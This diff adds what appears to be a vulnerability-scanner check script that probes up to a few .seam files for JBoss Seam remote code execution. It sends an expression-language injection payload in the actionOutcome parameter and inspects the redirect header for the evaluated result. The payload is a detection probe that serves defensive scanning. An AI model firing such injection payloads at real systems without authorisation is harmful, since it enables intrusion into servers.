@@ -1,0 +1,70 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// files to be tested
+var files = new Array();
+var lastJob = null;
+var vulnCount = 0;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testVulnOnFile(uri)
+{	
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri + "?actionOutcome=/pwn.xhtml%3fpwned%3d%23{expressions.getClass().forName('java.lang.Runtime')}";		
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound && lastJob.responseStatus == 302)
+	{
+		var locationStr = lastJob.response.headerValue('location');
+		//trace(locationStr);
+		
+		if (locationStr.indexOf("/pwn.seam?pwned=class+java.lang.Runtime") != -1)
+		{
+			alert(uri, 'JBoss_Seam_Remote_Code_Execution.xml', lastJob);
+			return true;
+		}	
+	}
+}
+/***********************************************************************************/
+function prepareFilesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			if (sf.name.endsWith(".seam")) 
+			{
+				//trace(sf.fullPath);
+				files.push(sf.fullPath);
+				
+				// don't test on more than 5 files
+				if (files.length > 5)
+					break;
+			}					
+		}	
+	}	
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareFilesToBeTested(list);
+if (files.length > 0) 
+{
+	for (var i=0; i<files.length; i++)
+	{
+		if (testVulnOnFile(files[i])) break;
+	}
+}
